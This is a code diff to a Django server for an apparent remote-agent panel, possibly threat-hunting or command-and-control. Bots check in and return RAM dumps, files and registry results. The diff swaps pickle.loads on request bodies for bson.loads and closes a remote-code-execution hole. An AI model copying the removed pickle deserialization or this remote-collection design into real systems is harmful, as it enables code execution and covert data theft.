@@ -5,7 +5,7 @@ from django.core.exceptions import ObjectDoesNotExist
 
 from panel.models import Bot, Artifact, Query, Command, Config #, Hunt
 
-import os, urllib, pickle, datetime, multiprocessing
+import os, urllib, bson, datetime, multiprocessing
 # Create your views here.
 
 FILE_DIRECTORY = os.path.dirname(os.path.abspath(__file__)) + "\\UPLOADS"
@@ -39,7 +39,7 @@ def receive_ramdump_thread(bot):
 		cmd.data = "Dump interrupted"
 		cmd.save()
 		return
-	
+
 	print('Received connection from', addr)
 	cmd = Command.objects.get(target__computer_name=bot, type='ramdump')
 	cmd.done = True
@@ -52,7 +52,7 @@ def receive_ramdump_thread(bot):
 
 	ram = open(filename, 'wb+')
 	try:
-		
+
 		while True:
 			data = conn.recv(1024)
 			if not data: break
@@ -75,7 +75,7 @@ def receive_ramdump_thread(bot):
 		return
 
 	ram.close()
-	conn.close()	
+	conn.close()
 
 	# record the success
 	cmd.done = True
@@ -87,12 +87,12 @@ def receive_ramdump_thread(bot):
 	return
 
 def record_hunt_info(bot, game):
-	
+
 	for artifact in game:
 		# check if artifact has already been seen
 		query_id = artifact[0]
 		data = artifact[1]
-		
+
 		try:
 			a = Artifact.objects.get(original_query__id=query_id, data=data)
 		except ObjectDoesNotExist as e:
@@ -109,7 +109,7 @@ def register_bot(info):
 	b = Bot()
 	b.computer_name = info['node']
 	b.system = info['system']
-	b.node =info['node'] 
+	b.node =info['node']
 	b.release = info['release']
 	b.version = info['version']
 	b.machine = info['machine']
@@ -157,10 +157,10 @@ def build_configuration(bot):
 def gate(request):
 
 	if request.method == 'POST':
-		data = pickle.loads(request.body)
+		data = bson.loads(request.body)
 		node_id = data['node_id']
 		bot = get_object_or_404(Bot, computer_name=node_id)
-		
+
 		if int(data['matches']) > 0:
 			record_hunt_info(bot, data['game'])
 
@@ -171,7 +171,7 @@ def gate(request):
 		node_id = request.GET.get('node', None)
 		if not node_id:
 			raise Http404
-		
+
 		try: # query DB for node, if not present then create it
 			print("Searching node id %s" % node_id)
 			bot = Bot.objects.get(computer_name=node_id)
@@ -185,7 +185,7 @@ def gate(request):
 
 		bot.last_checkin = datetime.datetime.now()
 		bot.save()
-		
+
 		# respond with proper configuration
 		return HttpResponse(conf)
 
@@ -194,7 +194,7 @@ def command_results(request):
 	if request.method == 'GET':
 		raise Http404
 
-	command_results = pickle.loads(request.body)
+	command_results = bson.loads(request.body)
 
 	for c in command_results:
 		id = c['command_id']
@@ -203,8 +203,8 @@ def command_results(request):
 
 		cmd = get_object_or_404(Command, id=id)
 		cmd.done = c['done']
-		
-		if cmd.type == 'getfile' or cmd.type == 'getfileenc' and cmd.done == True:	
+
+		if cmd.type == 'getfile' or cmd.type == 'getfileenc' and cmd.done == True:
 			filename = cmd.body.split('\\')[-1]
 			filename = ("%s-%s.file" % (cmd.target.computer_name, filename))
 			if cmd.type == 'getfileenc': filename += '.encrypted'
@@ -217,11 +217,11 @@ def command_results(request):
 		if cmd.type == 'regfind' and cmd.done == True:
 			cmd.data = data
 
-		cmd.save()	
+		cmd.save()
 
 	return HttpResponse("OK")
 
-	
+
 def download_agent(request):
 	data = open('/home/kraken/agent.zip', 'rb').read()
 	response = HttpResponse(data)
